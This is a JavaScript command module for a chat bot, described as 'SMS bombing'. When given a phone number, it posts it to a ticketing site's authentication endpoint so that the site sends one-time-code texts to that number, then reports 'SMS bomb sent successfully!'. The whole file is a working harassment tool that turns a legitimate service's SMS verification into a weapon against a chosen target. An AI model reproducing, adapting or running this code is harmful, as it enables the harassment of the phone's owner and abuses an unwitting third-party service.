const axios = require("axios");

module.exports.config = {
    name: "sms",
    version: "1.0.0",
    permission: 0,
    credits: "Rahad",
    description: "SMS bombing",
    prefix: true,
    category: "sms send",
    usages: "[phone_number]",
    cooldowns: 5,
    dependencies: {}
};

module.exports.run = async function({ api, event, args }) {
    const { threadID } = event;
    const phoneNumber = args[0];

    if (!phoneNumber) {
        api.sendMessage("Please provide the phone number.", threadID);
        return;
    }

    try {
        const authResponse = await axios.post("https://api.bdtickets.com/v1/auth", {
            createUserCheck: true,
            phoneNumber: phoneNumber,
            applicationChannel: "WEB_APP"
        });

        if (authResponse.status === 200 && authResponse.data) {
            api.sendMessage("SMS bomb sent successfully!", threadID);
        } else {
            api.sendMessage("Authentication failed. Please check your phone number.", threadID);
        }
    } catch (error) {
        console.error(error);
        api.sendMessage("An error occurred while sending the SMS bomb.", threadID);
    }
};
